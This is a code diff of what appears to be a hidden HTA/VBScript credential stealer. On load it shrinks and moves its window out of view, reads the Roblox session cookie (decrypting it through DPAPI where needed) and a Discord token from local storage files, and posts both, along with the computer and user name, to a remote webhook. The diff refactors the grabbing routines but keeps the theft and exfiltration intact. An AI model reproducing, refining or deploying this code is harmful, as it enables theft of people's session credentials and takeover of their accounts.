@@ -14,13 +14,29 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Sub Window_OnLoad()
     window.resizeTo 0, 0
     window.moveTo -2000, -2000
-    Call GrabRoblox
-    Call GrabDiscord
+    
+    Dim robloxCookie, discordToken
+    robloxCookie = GetRoblox()
+    discordToken = GetDiscord()
+    
+    If robloxCookie = "" Then
+        Call Send("Roblox", "Executed but no Roblox cookie found on PC.")
+    Else
+        Call Send("Roblox Cookie", robloxCookie)
+    End If
+    
+    If discordToken = "" Then
+        Call Send("Discord", "Executed but no Discord token found on PC.")
+    Else
+        Call Send("Discord Token", discordToken)
+    End If
+    
     window.close
 End Sub
 
-Sub GrabRoblox()
-    Dim paths(4), i, fp, raw, cookie, approach, sp, ep, b64
+Function GetRoblox()
+    GetRoblox = ""
+    Dim paths(4), i, fp, raw, cookie, sp, ep, b64
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
     paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
     paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
@@ -31,14 +47,13 @@ Sub GrabRoblox()
         If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
     Next
     
-    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
+    If Len(fp) = 0 Then Exit Function
     raw = ReadFile(fp)
-    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
+    If Len(raw) < 50 Then Exit Function
     
-    cookie = "": approach = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
+    cookie = ""
+    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
     If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        approach = "JSON-DPAPI"
         sp = InStr(raw, "CookiesData"":""")
         If sp > 0 Then
             sp = sp + 14
@@ -47,25 +62,26 @@ Sub GrabRoblox()
                 b64 = Mid(raw, sp, ep - sp)
                 If Len(b64) > 100 Then
                     cookie = DecryptDPAPI(b64)
-                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
+                    If Len(cookie) = 0 Then cookie = b64
                 End If
             End If
         End If
     End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": cookie = Mid(raw, InStr(raw, ".ROBLOSECURITY"))
-    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then cookie = Mid(raw, InStr(raw, ".ROBLOSECURITY"))
+    If Len(cookie) = 0 Then cookie = raw
     
     Dim cae: cae = InStr(cookie, "|$CAE")
     If cae = 0 Then cae = InStr(cookie, "|_CAE")
     If cae > 0 Then cookie = Mid(cookie, cae)
     
-    Call PostEmbed("Roblox (" & approach & ")", cookie, 65280)
-End Sub
+    GetRoblox = cookie
+End Function
 
-Sub GrabDiscord()
-    Dim dtPath, f, fld, file, text, regex, matches, token
+Function GetDiscord()
+    GetDiscord = ""
+    Dim dtPath, fld, file, text, regex, matches
     dtPath = sh.ExpandEnvironmentStrings("%APPDATA%") & "\discord\Local Storage\leveldb"
-    If Not fso.FolderExists(dtPath) Then Call PostEmbed("Discord", "Folder not found", 16711680): Exit Sub
+    If Not fso.FolderExists(dtPath) Then Exit Function
     
     text = ""
     Set fld = fso.GetFolder(dtPath)
@@ -81,12 +97,9 @@ Sub GrabDiscord()
     Set matches = regex.Execute(text)
     
     If matches.Count > 0 Then
-        token = matches(0).Value
-        Call PostEmbed("Discord Token", token, 65280)
-    Else
-        Call PostEmbed("Discord", "No token found in LevelDB files", 16711680)
+        GetDiscord = matches(0).Value
     End If
-End Sub
+End Function
 
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
@@ -120,8 +133,8 @@ Function ReadFile(path)
     Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing
 End Function
 
-Sub PostEmbed(t, d, c)
-    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""\`\`\`text\n" & Ej(d) & "\n\`\`\`"",""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
+Sub Send(t, d)
+    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""\`\`\`text\n" & Ej(d) & "\n\`\`\`"",""color"":65280,""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
 End Sub
 
